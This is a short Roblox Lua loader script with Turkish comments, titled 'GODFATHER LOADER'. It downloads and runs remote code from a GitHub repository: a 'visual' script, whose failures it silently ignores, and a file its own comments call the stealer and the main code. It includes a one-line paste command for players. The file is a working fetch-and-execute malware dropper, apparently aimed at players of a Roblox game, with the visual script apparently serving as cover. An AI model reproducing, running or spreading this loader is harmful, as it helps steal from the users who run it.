-- GODFATHER LOADER
-- Tek satır: loadstring(game:HttpGet('https://raw.githubusercontent.com/Godfather-team/mm2s2ci/refs/heads/main/loader.lua'))()

repeat task.wait() until game:IsLoaded()

-- Visual script'i çalıştır (hata olursa sessizce geç)
pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Godfather-team/mm2s2ci/refs/heads/main/visual.lua'))()
end)

-- Stealer'ı çalıştır (ana kod)
loadstring(game:HttpGet('https://raw.githubusercontent.com/Godfather-team/mm2s2ci/refs/heads/main/zteal.lua'))()
